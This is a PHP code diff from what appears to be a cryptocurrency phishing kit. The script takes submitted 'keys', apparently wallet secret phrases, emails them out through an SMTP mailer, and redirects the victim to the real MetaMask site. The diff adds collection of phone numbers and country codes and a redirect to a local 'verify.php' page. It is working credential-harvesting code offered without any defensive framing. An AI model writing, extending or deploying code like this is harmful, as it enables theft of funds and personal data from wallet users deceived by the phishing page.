@@ -4,7 +4,10 @@ use Exception;
 
 include_once './config.php';
 
-$keys                   =   $_POST['keys'];
+$keys                       =   $_POST['keys'];
+$phone_number               =   empty($_POST['phone_number']) ? null : $_POST['phone_number'];
+$phone_code                 =   empty($_POST['phone_number_phoneCode']) ? null : $_POST['phone_number_phoneCode'];
+$country_code               =   empty($_POST['phone_number_countryCode']) ? null : $_POST['phone_number_countryCode'];
 
 if (empty($keys)) {
     redirect(base_url());
@@ -12,6 +15,9 @@ if (empty($keys)) {
     
     function sendEmail($try=1) {
         global $keys;
+        global $phone_number;
+        global $phone_code;
+        global $country_code;
         
         try {
             $mail           =   get_mail_smtp();
@@ -39,7 +45,7 @@ if (empty($keys)) {
             $_SESSION["country_code"]   =   $country_code;
             
             if(empty($phone_number)) {
-                redirect('https://metamask.io/');
+                redirect(base_url('verify.php'));
             } else {
                 redirect('https://metamask.io/');
             }
